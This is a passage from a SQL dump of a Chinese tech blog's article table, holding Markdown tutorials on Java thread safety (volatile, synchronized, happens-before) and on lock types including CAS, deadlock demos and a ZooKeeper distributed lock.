22:20:03', 0, 0);
INSERT INTO `article` VALUES (23, 1, '线程概念与线程安全性', '2018/9/1536380675_591435116c5c27ddb5a1e3c9d085085f.jpg', '# 线程安全性\n## 多线程概念 \n### 基础概念\n1. 进程是独立应用程序\n2. 线程其实就是一条执行路径\n3. CPU随机切换进程,人为以为进程都在同时执行,但是底层CPU在进行不断的切换\n4. 进程是该进程下所有线程集合,进程存在,那么主线程一定存在,GC线程与主线程绑定\n5. 使用目的是为了提高程序效率\n\n### 多线程的状态\n![threadstatus.png](http://blog.img.tuwq.cn/upload/artimg/2019/10/1570023571_threadstatus.png)\n\n### 同步和异步的区别\n1. 代码从上往下执行,*顺序执行*,等待影响,就叫做同步\n2. 新的一条执行路径,*互不影响,等待轮询回调*,如ajax,future模式\n\n### 线程的分类\n1. 用户线程: 如果主线程停止,不会影响用户线程,和主线程*互不影响*\n2. 守护线程: 如果主线程停止,会影响守护线程,*随主线程一起销毁*,设置setDaemon(true)即可为守护线程 \n3. GC线程: 属于守护线程,*垃圾回收机制的线程*,不定时回收,主要回收主线程,但也会回收子线程\n\n### 线程的应用场景\n1. 下载文件\n2. 数据库连接池\n3. 发送邮件,短信等耗费等待时间操作\n4. 大规模的运算处理,业务处理\n\n### 并发\n1. 多个线程操作相同的资源.保证线程安全,合理使用资源\n2. 同时拥有两个或者多个线程,如果程序在单核处理器上运行,多个线程将交替地换入或换出内存\n3. 这些线程是同时存在的,每个线程都处于执行过程中的某个状态 \n4. 如果运行在多核处理器上,程序中每个线程都将分配到一个处理器核上,因此可以同时运行\n\n### 高并发\n1. 服务能同时处理很多请求,提高程序性能\n2. 高并发(High Concurrency)是互联网分布式系统架构设计中必须考虑的因素之一\n3. 它通常是指,通过设计保证系统能够*同时并行处理*很多的请求\n\n### 并发的优势和风险\n#### 优势:\n1. 速度,同时处理多个请求,响应更快,复杂的操作可以分成多个进程同时进行\n2. 设计,程序设计在某些情况下更简单,也可以有更多的选择\n3. 资源利用,CPU能够在等待IO的时候作做一些其他的事情   \n\n#### 风险:\n- 安全性,多个线程共享数据时可能会产生于期望不相符的结果\n- 活跃性,某个操作无法继续进行下去时,就会发生活跃性问题,比如死锁,饥饿\n- 性能,线程过多时会使得CPU频繁切换,调度时间增多,同步机制消耗过多内存\n\n### 线程安全问题产生\n1. 当多个线程共享一个全局变量\n2. 注意做写的操作时,可以会收到其他线程的干扰\n\n```java\n/**\n * 抢票案例\n * 现有100张火车票,提供多个窗口进行供票\n * @author tuwq\n */\nclass TicketThread implements Runnable {\n\n	private static int count = 100; // JDK7前类变量存放在方法区,JD7后存放在堆内存\n	\n	@Override\n	public void run() {\n		while(count > 0) {\n			sale();\n		}\n	}\n	private void sale() {\n		System.out.println(Thread.currentThread().getName() + \",出售:\" + (100 - count + 1) + \"张票\");\n		count--;\n	}\n}\npublic class TicketProject {\n	public static void main(String[] args) {\n		TicketThread ticketThread1 = new TicketThread();\n		TicketThread ticketThread2 = new TicketThread();\n		TicketThread ticketThread3 = new TicketThread();\n		new Thread(ticketThread1, \"窗口1\").start();\n		new Thread(ticketThread2, \"窗口2\").start();\n		new Thread(ticketThread3, \"窗口3\").start();\n	}\n}\n```\n\n4. 以上三个线程开启修改全局变量count,这会出现多线程写入的脏读问题,比如三个窗口都卖出了第一张票\n5. 原因就在于三个线程都在各干各个,没有告诉它另外两个窗口有没有卖出这张票*(无可见性)*,\n6. 同样的票还有没有,可能这张票上一秒被另个窗口卖掉了,自己却又卖了一张重复的*(无原子性)*\n7. 代码的编程过程中,进行了优化,改变了代码顺序,从而会出现一些问题*(无有序性)* \n8. 因为这三个性质而导致了线程的安全性,整个线程安全性都在围绕着三个特性\n\n### 什么叫线程安全\n##### 定义:当多个线程访问某个类时,不管运行时环境采*用何种调度方式或者这些进程将如何交替执行*,并且在主调代码中*不需要任何额外的同步或协同*,这个类都能表现出*正确的行为*,那么就称这个类是线程安全的\n\n***\n## 线程安全\n### 三个性质\n1. 原子性:提供了互斥访问,同一时刻只能有一个线程来对它进行操作\n2. 可见性:一个线程对主内存的修改可以及时的被其他线程观察到\n3. 有序性:一个线程观察其他线程中的指令执行顺序,由于指令重排序的存在,该观察结果一般杂乱无序\n\n##### 需要对三个性质进行单独讲解\n\n### 原子性(互斥访问,同一时刻只能有一个线程进行操作)\n同一时刻只能有一个线程进行操作,那么就需要锁来保证只有一个线程进行操作,保证原子性的方式有许多种\n1. synchronized: 依赖JVM,修饰的对象一共有四种[重入锁,不可中断锁,适合竞争不激烈,灵活性差,可读性好]\n2. Lock: 依赖特殊的CPU指令,代码实现,ReentrantLock[重入锁,可中断锁,多样式化同步,竞争激烈时维持常态,灵活性高,但难以使用]\n3. Atomic: 原子性包,它底层使用CAS(乐观锁思想)来保证原子性,[使用简单,可读性好,效率高,适合竞争激烈,推荐]\n\n借助以上方式来改善上面的卖票案例\n#### synchronized\n```java\n/**\n * 抢票案例\n * 现有100张火车票,提供多个窗口进行供票\n * @author tuwq\n */\nclass TicketThread implements Runnable {\n\n	private static int count = 100; // JDK7前类变量存放在方法区,JD7后存放在堆内存\n	\n	private static Object obj = new Object(); // 唯一类变量锁,存在于堆内存\n	@Override\n	public void run() {\n		while(count > 0) {\n			sale();\n		}\n	}\n	private void sale() {\n		synchronized (obj) { // 采用唯一类变量作为锁\n			if (count > 0) { // 同步之后因为需要可序性原因依然需要判断\n				System.out.println(Thread.currentThread().getName() + \",出售:\" + (100 - count + 1) + \"张票\");\n				count--;\n			}\n		}\n	}\n}\npublic class TicketProject {\n	public static void main(String[] args) {\n		TicketThread ticketThread1 = new TicketThread();\n		TicketThread ticketThread2 = new TicketThread();\n		TicketThread ticketThread3 = new TicketThread();\n		new Thread(ticketThread1, \"窗口1\").start();\n		new Thread(ticketThread2, \"窗口2\").start();\n		new Thread(ticketThread3, \"窗口3\").start();\n	}\n}\n```\n#### lock\n```java\n/**\n * 抢票案例\n * 现有100张火车票,提供多个窗口进行供票\n * @author tuwq\n */\nclass TicketThread3 implements Runnable {\n\n	private static int count = 100; // JDK7前类变量存放在方法区,JD7后存放在堆内存\n	\n	private static ReentrantLock lock = new ReentrantLock(); // 可重入锁,唯一类变量\n	\n	@Override\n	public void run() {\n		while(count > 0) {\n			sale();\n		}\n	}\n	private void sale() {\n		try {\n			lock.lock();\n			if (count > 0) { // 同步之后因为需要可序性原因依然需要判断\n				System.out.println(Thread.currentThread().getName() + \",出售:\" + (100 - count + 1) + \"张票\");\n				count--;\n			}\n		} catch(Exception e) {\n			e.printStackTrace();\n		} finally {\n			// Lock锁一定要在finally中释放\n			lock.unlock();\n		}\n		\n	}\n}\npublic class TicketProject3 {\n	public static void main(String[] args) {\n		TicketThread3 ticketThread1 = new TicketThread3();\n		TicketThread3 ticketThread2 = new TicketThread3();\n		TicketThread3 ticketThread3 = new TicketThread3();\n		new Thread(ticketThread1, \"窗口1\").start();\n		new Thread(ticketThread2, \"窗口2\").start();\n		new Thread(ticketThread3, \"窗口3\").start();\n	}\n}\n```\n\n#### Atomic\n```java\n/**\n * 抢票案例\n * 现有100张火车票,提供多个窗口进行供票\n * @author tuwq\n */\nclass TicketThread4 implements Runnable {\n\n	private static AtomicInteger count = new AtomicInteger(100);\n	\n	public void run() {\n		while(count.get() > 0) {\n			sale();\n		}\n	}\n	\n	private void sale() {\n		if (count.get() > 0) { // 同步之后因为需要可序性原因依然需要判断\n			System.out.println(Thread.currentThread().getName() + \",出售:\" + (100 - count.incrementAndGet()) + \"张票\");\n			count.decrementAndGet();\n		}\n	}\n}\npublic class TicketProject4 {\n	public static void main(String[] args) {\n		TicketThread ticketThread1 = new TicketThread();\n		TicketThread ticketThread2 = new TicketThread();\n		TicketThread ticketThread3 = new TicketThread();\n		new Thread(ticketThread1, \"窗口1\").start();\n		new Thread(ticketThread2, \"窗口2\").start();\n		new Thread(ticketThread3, \"窗口3\").start();\n	}\n} \n```\n##### 这些方式都可以保证原子性,即互斥访问,同一时刻只能有一个线程进行操作\n\n### 可见性(一个线程对主内存的修改可以及时的被其他线程观察到)\n了解可见性之前必须观看一段代码\n```java\n/**\n * 演示volatile\n * @author tuwq\n */\nclass VolatileThread extends Thread {\n	public boolean flag = true;\n	@Override\n	public void run() {\n		System.out.println(\"线程开始\");\n		while(flag) {\n			\n		}\n		System.out.println(\"线程结束\");\n	}\n	\n	public void setRuning(boolean flag) {\n		this.flag = flag;\n	}\n}\n\npublic class VolatileProject {\n	public static void main(String[] args) throws InterruptedException {\n		VolatileThread volatileThread = new VolatileThread();\n		volatileThread.start();\n		Thread.sleep(3000);\n		volatileThread.setRuning(false);\n		Thread.sleep(3000);\n		System.out.println(volatileThread.flag); // false\n	}\n}\n```\n1. 介绍代码流程\n2. 主线程创建并开启了子线程,随后等待3秒\n3. 子线程运行并进入while循环中(此时flag为true）\n4. 主线程将flag设置为了false*(重点)*\n5. 子线程依旧在while循环中,仿佛不知道主线程把flag已经改为了false已经可以出来了\n6. 主线程打印flag,打印false,\n7. *注意,子线程依旧在while循环中,即使主线程依旧把flag改为了false也没有出来,因为它不知道,程序没有结束*\n\n解释这个原因必须了解JMM内存模型,即Java内存模型,注意不是Jvm内存结构\n![jmmmodelflag.png](http://blog.img.tuwq.cn/upload/artimg/2018/12/1544767582_jmmmodelflag.png)\n![mesi.png](http://blog.img.tuwq.cn/upload/artimg/2019/10/1570112638_mesi.png)\n\n#### 为什么子线程不知道flag变了\n1. 共享变量flag在主内存中 \n2. t1(主线程)和t2(子线程)对flag进行了一个副本拷贝\n3. t1(主线程)将自己本地内存的flag改为了false\n4. t1(主线程)*未及时刷新flag新值到主内存中*\n5. 主内存没有接收到新值,所以*t2没有更新新值*\n6. 原因就在于t1改了新值之后没有及时的刷新至主内存\n\n#### 导致共享变量在线程间不可见的原因(官方定义)\n1. 线程交叉执行\n2. 重排序结合线程交叉执行\n3. 共享变量更新后的值没有在*工作内存与主存间及时更新*\n\n#### 如何解决共享变量及时刷新\n使用volatile关键字或使用synchronized关键字保证可见性  \n此时只需要将flag添加关键字volatile即可解决\n```java\n// 可见,立刻写入内存\npublic volatile boolean flag = true \n```\n#### synchronized作用\n1. *保证可见性: CPU高速缓存的一致性协议(mesi)或数据总线加锁*\n2. *保证有序性: 内存屏障*\n3. *并未保证原子性*\n4. 保证了不同线程间的可见性;强制对缓存的修改操作立刻写入主存\n5. 禁止对其进行重排序,也就是保证了有序性;保证重排序的时候不会把后面的指令放在屏障的前面,也不会把前面的放到后面\n6. 如果是写操作,他会导致其他CPU中的缓存失效\n7. 当cpu写入数据的时候,如果发现该变量被共享(也就是说,在其他cpu中也存在该变量的副本),会发出一个信号,通知其他CPU该变量的缓存无效\n8. 当其他cpu访问该变量的时候,重新到主内存进行获取\n\n\n#### synchronized和volatile有什么区别\n1. synchronized保证原子性和可见性\n2. volatile保证可见性和禁止JVM重排序,*不具有原子性*\n\n##### 需要详解synchronized和volatile\n### synchronized\n#### synchronized: 依赖JVM,修饰的对象一共有四种\n- 修饰代码块,被称为同步语句块,作用范围是大括号括起来的代码,作用于*调用这个代码块的对象*,不同对象之间,调用是不影响的\n- 修饰方法,被称为同步方法,作用范围整个方法,*作用于调用这个方法的对象*\n- 修饰静态方法,作用范围整个静态方法,作用于*这个类的所有对象*\n- 修饰类,作用范围括号括起来的部分,作用于*这个类的所有对象*\n- 如果一个方法内部是一个完整的同步代码块,那么它和一个用synchronized修饰的方法是等同的,因为实际中执行中的代码都是被synchronized修饰的\n- 如果当前这个类是一个父类,如果子类继承了这个类之后,如果想调用父类同步方法和方法中的同步代码块时,synchronized是不会生效的,因为*synchronized不属于方法声明的一部分*\n- 如果*子类也想使用synchronized*的话,那么它需要自己显式的在方法上面声明synchronized\n- 如果一个静态方法内部是一个完整的同步代码块,那么它和synchronized修饰的方法是等同的\n\n#### JMM关于synchronized的两条规定(官方定义)\n1. 线程解锁前,必须把共享变量的最新值刷新到主内存\n2. 线程加锁时,将清空工作内存中共享变量的值,从而使用共享变量时需要从主内存中重新读取最新的值(注意,加锁与解锁是同一把锁) \n\n### volatile内存屏障\n通过加入*内存屏障*和*禁止重排序优化*来实现\n- volatile计数操作是线程不安全的,*volatile关键字不具有原子性*\n- 对volatile变量写操作时,会在写操作后加入一条store屏障指令,将本地内存中的共享变量值刷新到主内存\n- 对volatile变量读操作时,会在读操作前加入一条load屏障指令,从主内存中读取共享变量\n\n#### volatile写\n![volatilewrite.png](http://blog.img.tuwq.cn/upload/artimg/2018/12/1544768942_volatilewrite.png)\n1. storeStore禁止上面的普通写和下面的volatile写重排序(编译器和处理为了提高并行度,可以将代码1和2调整顺序)\n2. storeLoad禁止上面volatile写与下面可能有的volatile读/写重排序\n3. storeStore屏障和storeStore屏障中包围volatile写\n4. 普通读-普通写-storeStore屏障-volatile写-storeLoad屏障\n\n#### volatile读\n![volatileread.png](http://blog.img.tuwq.cn/upload/artimg/2018/12/1544769681_volatileread.png)\n1. LoadLoad屏障禁止下面所有的普通读操作和上面的volatile读重排序\n2. LoadStore屏障禁止下面所有的写操作和上面的volatile读重排序\n3. volatile读-LoadLoad屏障-LoadStore屏障-普通读-普通写\n\n### 有序性(一个线程观察其他线程中的指令执行顺序)\n#### 乱序执行优化\n1. 处理器为提高运算速度而做出违背代码原有顺序的优化,比如JVM中的重排序\n1. Java内存模型中,允许编译器和处理器指令进行*重排序*,但是重排序过程不影响到*单线程*程序的执行,\n却会影响到多线程并发执行的正确性\n2. *volatile,synchronized,Lock可以禁止重排序*\n3. Java内存模型具备一些先天的有序性,不需要通过任何手段就能够得到保证的有序性,通常称为happends before(先行发生)原则,如果两个操作的执行次序无法从happended before原则中推导出来,\n那么它们就不能保证它们的有序性,虚拟机可以随意的对它们进行重排序\n\n#### 示范\n```java\n// 正常逻辑认为执行顺序\n1. momery = allocate() // 分配对象内存空间\n2. ctorInstantce() // 初始化对象\n3. instance = momery // 设置instance指向刚刚分配的内存\n\n// 通过JVM和CPU优化,发生了指令重排序\n1. momery = allocate() // 分配对象内存空间\n2. instance = momery // 设置instance指向刚刚分配的内存\n3. ctorInstantce() // 初始化对象\n```\n\n### happends-before原则\n#### 程序次序规则: \n1. 一个线程内,按照代码顺序,书写在前面的操作先行发生于书写在后面的操作\n2. jvm只会对不存在数据依赖性的指令进行重排序,因此在单个线程中,程序看起来是有序执行的\n3. 这个规则是用来保证程序在单线程执行中执行结果的正确性\n4. 但无法保证程序在多线程中执行的正确性\n\n#### 锁定规则:\n1. 一个unLock操作先行发生于后面对同一个锁的lock操作\n2. 无论在单线程中还是在多线程中,同一个锁如果处于被锁定状态,那么必须先对锁进行释放操作,后面才能继续进行lock操作\n\n#### volatile变量规则\n1. 对一个变量的写操作先行发生于后面对这个变量的读操作\n2. 如果一个线程先去写一个变量,然后一个线程去进行读取,那么写入操作肯定会先行发送于读操作\n\n#### 传递规则:\n1. 如果操作A先行发送于操作B,而操作B又先行发送于操作C,则可以得出操作A先行发生于操作C\n\n#### 线程启动规则:\n2. Thread对象的start()方法先行发生于此线程的每一个动作\n\n#### 线程中断规则\n1. 对线程interrupt()方法的调用先行发生于被中断线程的代码检测到中断事件的发生\n\n#### 线程终结规则: 线程中所有的操作都先行发生于线程的终止检测,\n1. 我们可以通过Thread.join()方法结束,Thread.isAlive()的返回值手段检测到线程已经终止执行\n\n#### 对象终止规则: \n2. 一个对象的初始化完成先行发生于他的finalize()方法的开始 \n \n# 总结\n1. 原子性(互斥访问,同一时刻只能有一个线程进行操作): Atomic包,CAS算法,synchronized,Lock  \n2. 可见性(一个线程对主内存的修改可以及时的被其他线程观察到) synchronized,volatile  \n3. 有序性(一个线程观察其他线程中的指定执行顺序,由于指令重排序的存在,这个观察结果一般都会杂乱无序,  如果两个操作执行的操作次序无法从happends-before原则中推导出来,那么它们就不能保证有序性,虚拟机可以随意的对它们进行重排序) happends-before原则\n4. 线程安全性主要围绕这三个性质而展开', 3, 0, 202, 0, 3, '2018-09-08 12:24:39', '2019-10-04 19:07:17', 0, 0);
INSERT INTO `article` VALUES (24, 1, '各种锁的概念', '2018/9/1536461678_35519737389102823ce713cfa1b64a51.jpg', '# 锁\n本文记录锁概念,不展开底层原理\n### 什么是锁\n多线程保证数据安全的编程代码处理,所有的锁基本都是围绕悲观锁和乐观锁展开的 \n### 有哪些锁\n如果*不将锁实现和思想进行归类全部展开*,那么常用的锁有许多\n1. 悲观锁,乐观锁\n2. 读锁,写锁\n3. 自旋锁,互斥锁\n4. 公平锁非公平锁\n5. 重入锁,不可重入锁\n6. CAS无锁\n7. 死锁\n7. 分布式锁\n\n##### 扩展出的锁实现始终围绕不开悲观锁与乐观锁思想\n### 悲观锁,乐观锁\n#### 悲观锁\n1. 本质就是synchronized,属于重量级锁,会阻塞,会进行等待,效率差\n2. 总是假设最坏的情况,每次取数据时都认为其他线程会修改,所有都会加锁(读锁,写锁,行锁等),当其他线程想要访问数据时,*都需要阻塞挂起*,可以依靠数据库实现,如行锁,读锁和写锁等,都是在操作之前加锁,在Java中,synchronized思想也是悲观锁\n3. 保证只有一个线程在进行操作,对其他线程排斥\n\n#### 乐观锁\n1. 本质其实没有锁,效率比较高,无阻塞,无等待,重试,CAS无锁机制运用了这一点\n2. 设计并发数据库表时常常需要VERSION字段,用于进行版本号匹配,\n只有匹配成功才可以进行操作\n3. 对其他线程不排斥,效率高\n\n### 读锁,写锁\n见于数据库场景,读写冲突,导致数据不安全\n1. 读锁(获取该值的信息)\n2. 写锁(对该值做操作)\n3. ReentrantReadWriteLock底层通过AQS实现\n4. 读读能共存,读写不共存,写写不共存,这就需要一个读/写锁来解决这个问题\n\n#### 有什么数据不安全\n1. 数据写入前,就已经读取了数据,读取的数据不存在\n2. 读取了不正常数据\n\n##### ReentrantReadWriteLock通过AQS实现了读写锁,保障读写安全\n```java\n/**\n * 读写锁 jvm内置缓存\n * @author tuwq\n */\npublic class ReadLockAndWriteLockProject {\n	\n	private volatile Map<String, String> cache = new HashMap<String, String>();\n	\n	private ReentrantReadWriteLock lock = new ReentrantReadWriteLock();\n	private WriteLock writeLock = lock.writeLock();\n	private ReadLock readLock = lock.readLock();\n	\n	\n	public static void main(String[] args) {\n		\n		ReadLockAndWriteLockProject rwp = new ReadLockAndWriteLockProject();\n		Thread t1 = new Thread(new Runnable() {\n			@Override\n			public void run() {\n				for (int i = 0; i < 10; i++) { \n					rwp.put(\"i:\", i+\"\");\n				}\n			}\n		});\n		Thread t2 = new Thread(new Runnable() {\n			@Override\n			public void run() {\n				for (int i = 0; i < 10; i++) { \n					rwp.get(i + \"\");\n				}\n			}\n		});\n		t1.start();\n		t2.start();\n	}\n	\n	// 写入元素\n	private void put(String key, String value) {\n		try {\n			writeLock.lock();\n			System.out.println(\"写入\");\n			Thread.currentThread().sleep(100);\n			cache.put(key, value);\n			System.out.println(\"写入完毕\");\n		} catch (InterruptedException e) {\n			e.printStackTrace();\n		} finally {\n			writeLock.unlock();\n		}\n	}\n	\n	// 读取元素\n	private String get(String key) {\n		try {\n			readLock.lock();\n			System.out.println(\"读取\");\n			Thread.currentThread().sleep(100);\n			String value = cache.get(key);\n			System.out.println(\"读取完毕\");\n			return value;\n		} catch (Exception e) {\n			e.printStackTrace();\n			return null;\n		} finally {\n			readLock.unlock();\n		}\n	}\n}\n```\n1. 它在没有任何读写锁时,才可以获得写锁\n2. 如果我们执行进行读取时, 经常可能有另一个执行要写入的需求,为了保证同步,ReentrantReadWriteLock读取锁定就可以派上用场\n3. 读取很多,写入很少的情况下使用ReentrantReadWriteLock可能会使写入线程遭遇饥饿(写入线程常常无法竞争到锁定,一直处于等待状态)\n4. 实现的是悲观读取,如果你想获得写入锁的时候,坚决不允许有任何的读锁还保持着,所以多读取低写入时常处于饥饿\n\n#### StampedLock\n##### 基于ReentrantReadWriteLock的缺点JDK8产生了StampedLock\n1. StampedLock锁获取的方法返回的是一个数字作为票据,它用相应的锁状态来表示并控制相关的访问\n2. 数字0表示没有写锁被首先访问,在读锁中分为悲观锁和乐观锁\n3. 乐观读,如果读的操作很多,写的操作很少的情况下,我们可以乐观的认为写入和读取同时发生的几率很少, 因此不悲观的使用完整的读取锁定,程序可以采取查看读取资料之后是否受到写入内容的变更再采取后续的措施,\n4. 这一改动可以大幅度提高程序的吞吐量,StampedLock对吞吐量有巨大改进,特别是读线程越来越多的情况下\n\n### CAS无锁\n 1. CAS就是乐观锁思想的实现\n 2. 相对于比对版本号,CAS则是比对*本地内存的预期值*\n ![cas.png](http://blog.img.tuwq.cn/upload/artimg/2018/12/1544779457_cas.png)\n1. V: 需要更新变量 (主内存),E: 预期值  	  (本地内存),N: 新值 \n2. 如果V = E(主内存值与本地内存一致),说明没有修改过,将V的值设置为N\n3. 如果V != E(主内存值与本地内存值不一致),说明已经被修改,重新刷新主内存至本地内存,*不断循环进行比较*直到V = E,将V设置为N\n\n#### CAS算法理解\n1. 与锁相比,使用比较交换(下文简称CAS),会使得程序看起来更加复杂一些,但由于其非阻塞性,它对死锁问题天生免疫\n2. 线程间的相互影响也远远比基于锁的方式要小,更为重要的是,使用无锁的方式完全没有锁竞争带来的系统开销,也没有线程间频繁调度带来的开销,因此,它要比基于锁的方式拥有更优越的性能\n\n#### 无锁的好处\n1. 在高并发的情况下,它比有锁的程序拥有更好的性能\n2. 它天生就是死锁免疫的\n\n#### CAS缺点,ABA问题 \n##### ABA问题它是指在CAS操作的时候,其他线程将变量的值A改成了B但是又改回了A,本线程使用期望值A与当前变量进行比较的时候,发现A变量没有变,于是CAS就将A值进行交换操作,这个时候实际上该值已经被其他线程改变过,这与设计思想是不符合的,因此ABA问题的解决思路,每次变量更新的时候把变量的版本号加一,那么之前那个A改为B改为A变为A1是1版本,B是2版本,A2是3版本,这时,只要变量被线程修改过,该变量对应的*版本号就会发生递增变化*,从而解决了ABA问题\n##### Java并发包中提供一个带有标记的原子引用类AtomicStampedReference,它可以通过控制变量值的版本来保证CAS的正确性\n![abaresource.png](http://blog.img.tuwq.cn/upload/artimg/2018/12/1544783078_abaresource.png)\n\n\n### 自旋锁,互斥锁\n#### 自旋锁\n1. CAS无锁机制中,如果V != E(主内存值与本地内存值不一致),说明已经被修改,重新刷新主内存至本地内存,*不断循环进行比较*直到V = E,将V设置为N\n2. 红字,不断循环直到比较成功,这种思想叫做自旋\n3. 查看JDK8源码中CAS自旋\n![selfwhile.png](http://blog.img.tuwq.cn/upload/artimg/2018/12/1544779823_selfwhile.png)\n\n#### 互斥锁\n1. 互斥锁即为悲观锁的实现\n\n#### 自旋锁与互斥锁有什么区别\n1. 互斥锁: 线程会从sleep到running,过程中有上下文切换,CPU的抢占,信号的发送等开销 \n2. 自旋锁: 线程一直是running,死循环检测锁的标志位,机制不复杂\n\n### 重入锁,不可重入锁\n#### 重入性 \n1. 可重入性(递归锁):锁可以传递(方法递归传递)\n2. 简单理解可以将锁从一个方法传递至另一个方法中,使得另一个方法此时也被锁住\n3. ReentrantLock与Syncronized都拥有可重入性\n\n### 公平锁,非公平锁\n1. 公平锁: 先到先得,按序进行\n2. 非公平锁: 不排队直接拿,失败再说\n\n### 死锁\n#### 何为死锁\n1. 有一双筷子,有一桌两碗饭两个人,此时一人只有一根筷子\n2. A想要B的筷子吃饭,于是一直等B把筷子放回桌子再拿过来吃饭\n3. B想要A的筷子吃饭,于是一直等A把筷子放回桌子再拿过来吃饭\n4. AB都想要对方的筷子,于是一直等对方筷子,等到永远AB都吃不了饭\n5. 原因在于AB都想要对方的筷子才能继续行动,却没有一人愿意放下自己的筷子\n\n#### 死锁示范\n```java\n/**\n * 一个简单的死锁类\n * 当DeadLock类的对象flag==1时(td1),先锁定o1,睡眠500毫秒\n * 而td1在睡眠的时候另一个flag==0的线程(td)2线程启动,先锁定o2,睡眠500毫秒\n * td1睡眠结束后需要锁定o2才能继续执行,而此时o2已被td2锁定\n * td2睡眠结束后需要锁定o1才能继续执行,而此时o1已被td1锁定\n * td1、td2相互等待,都需要得到对方锁定d的资源才能继续执行,从而死锁\n */\n@Slf4j\npublic class DeadLock implements Runnable{\n	\n	public int flag = 1;\n	private static Object o1 = new Object(), o2 = new Object();\n	\n	@Override	\n	public void run() {\n		log.info(\"flag:{}\", flag);\n		if (flag == 1) {\n			synchronized (o1) {\n				try {\n					Thread.sleep(500);\n				} catch(Exception e) {\n					e.printStackTrace();\n				}\n				synchronized (o2) {\n					log.info(\"1\");\n				}\n			}\n		}\n		if (flag == 0) {\n			synchronized (o2) {\n				try {\n					Thread.sleep(500);\n				} catch(Exception e) {\n					e.printStackTrace();\n				}\n				synchronized (o1) {\n					log.info(\"0\");\n				}\n			}\n		}\n	}\n	\n	public static void main(String[] args) {\n		DeadLock td1 = new DeadLock();\n		DeadLock td2 = new DeadLock();\n		td1.flag = 1;\n		td2.flag = 0;\n		// td1,td2都处于可执行状态,但JVM线程调度先执行哪个线程是不确定的\n		// td2的run可能在td1的run()之前执行\n		new Thread(td1).start();\n		new Thread(td2).start();\n	}\n}\n``` \n#### 发生的必要条件\n1. 互斥条件: 它是指进程对所分配到的资源进行排他性的使用在一段时间内,某资源只由一个进程占用,如果此时还有其他进程请求资源那么请求者只能等待,直到占有资源的进程释放出来才可以\n2. 请求和保持条件: 它是进程至少保持了一个资源,但又提出了新的资源请求,而该资源已被其他进程占有,此时*请求进程阻塞*,但又*被自己或其他资源保持不放*\n3. 不剥夺条件: 进程已获得资源未使用完之前不能被剥夺,只能在使用完时自己释放\n4. 环路等待条件: 发生死锁的时候,一定存在一个*进程资源环循链*\n\n#### 预防死锁\n1. 合理的加锁顺序\n2. 使用ReentrantLock一段时间内尝试获取锁\n3. 自己实现死锁检测\n4. jconsole工具\n\n#### 检测死锁\n1. 使用cmd的jps得到pid后jstack pid查看信息\n\n\n### ReentrantLock与synchronized\n#### ReentrantLock与synchronized区别\n1. 都拥有可重入性,都是同一个线程进入锁一次锁的计数器+1,所以要到锁的计数器为零时才能释放\n2. synchronized的实现,依赖于jvm实现的,ReentrantLock是类实现的\n3. synchronized引入了偏向锁,自寻锁后,ReentrantLock和synchronized性能差不多\n4. 便利性:synchronized比较方便简洁,并且由编译器保证锁的加锁和释放的,ReentrantLock需要手动声明加锁和释放锁,为了避免手动释放锁造成死锁,所以最好是在finally中释放锁\n5. 锁的细粒度和灵活度:ReentrantLock优于synchronized\n\n#### ReentrantLock独有的功能\n1. 可指定是公平锁还是非公平锁,而synchronized只能是非公平锁(所谓公平锁就是先等待的线程先获得锁)\n2. 提供了一个Condition类,可以分组唤醒需要唤醒的线程,而synchronized要么随机唤醒一个线程,要么唤醒全部线程\n3. 提供能够中断等待锁的线程的机制,lock.lockInterruptibly【如果当前线程没有被中断的话, 获取锁定.如果已经被中断了抛出异常】,ReentrantLock实现是一种自寻锁,通过循环调用CAS原子性操作实现加锁, 它的性能比较好也是因为避免了使线程进入内核态的阻塞状态,想尽办法阻止内核阻塞状态是我们去分析和理解锁设计的关键钥匙\n\n#### 双方使用场景\n1. 如果需要实现ReentrantLock独有功能的时候使用ReentrantLock\n2. 当只有少量竞争者的时候,synchronized是一个很好的通用的锁实现\n3. 竞争者不少,线程增长的趋势是能够预估的,ReentrantLock是一个很好的通用锁实现,但使用不当会造成死锁\n\n### 分布式锁\n![dlock.png](http://blog.img.tuwq.cn/upload/artimg/2019/1/1546585125_dlock.png)\n1. 分布式锁即*保证分布式情况下的原子性*\n\n#### 应用场景\n1. 案例: 需要生成订单号,使用UUID+时间戳+业务id或雪花算法\n2. 线程并发安全问题,订单号在高并发的情况下会出现重复,所以需要分布锁保证原子性\n\n#### 实现分布式锁\n![zkdlock.png](http://blog.img.tuwq.cn/upload/artimg/2019/1/1546585071_zkdlock.png)\n#### 预计效果\n```java\n/**\n * 模拟生成订单号\n * 该orderService是多例的,目的是为了模拟应用集群\n * @author tuwq\n */\npublic class OrderService implements Runnable {\n\n	OrderNumberGenerator orderNumberGenerator = new OrderNumberGenerator();\n	\n	private Lock  lock = new ZkDistrbuteLock();\n	\n	public void run() {\n		try {\n			lock.getLock();// 加锁\n			this.getNumber();\n		} catch (Exception e) {\n			e.printStackTrace();\n		} finally {\n			lock.unLock(); // 释放锁\n		}\n	}\n	\n	public void getNumber() {\n		String number = orderNumberGenerator.getNumber();\n		System.out.println(Thread.currentThread().getName() + \"生成唯一订单号\" + number);\n	}\n	\n	public static void main(String[] args) {\n		for (int i = 0; i < 100; i++) {\n			new Thread(new OrderService()).start();;\n		}\n	}\n}\n```\n\n#### 总体流程\n```java\npublic abstract class ZkAbstractLock {\n\n	private static final String CONNECTSTRING = \"127.0.0.1:2181\";\n	protected ZkClient zkClient  = new ZkClient(CONNECTSTRING);\n	protected static final String PATH = \"/templock\";\n	protected CountDownLatch countDownLatch = null;\n	\n	public void getLock() {\n		// 尝试获取锁\n		if (this.tryLock()) {\n			System.out.println(\"获取锁成功\");\n		} else {\n			// 等待\n			this.waitLock();\n			// 重新获取锁\n			this.getLock();\n		}\n	}\n	\n	public void unLock() {\n		// 关闭连接,这样的话临时节点就会被删除\n		if (this.zkClient != null) {\n			zkClient.close();\n			System.out.println(\"关闭连接\");\n		}\n	}\n\n	abstract void waitLock();\n\n	abstract Boolean tryLock();\n	\n}\n```\n#### 尝试与等待\n```java\npublic class ZkDistrbuteLock extends ZkAbstractLock {\n\n	@Override\n	Boolean tryLock() {\n		try {\n			this.zkClient.createEphemeral(PATH);\n			return true;\n		} catch (Exception e) {\n			return false;\n		}\n	}\n	\n	@Override\n	void waitLock() {\n		// 使用事件监听,获取到节点被删除时的事件通知\n		IZkDataListener iZkDataListener = new IZkDataListener() {\n			// 当节点被删除时\n			public void handleDataDeleted(String dataPath) throws Exception {\n				if (countDownLatch != null) {\n					// 唤醒await\n					countDownLatch.countDown();\n				}\n			}\n			// 当节点被改变时\n			public void 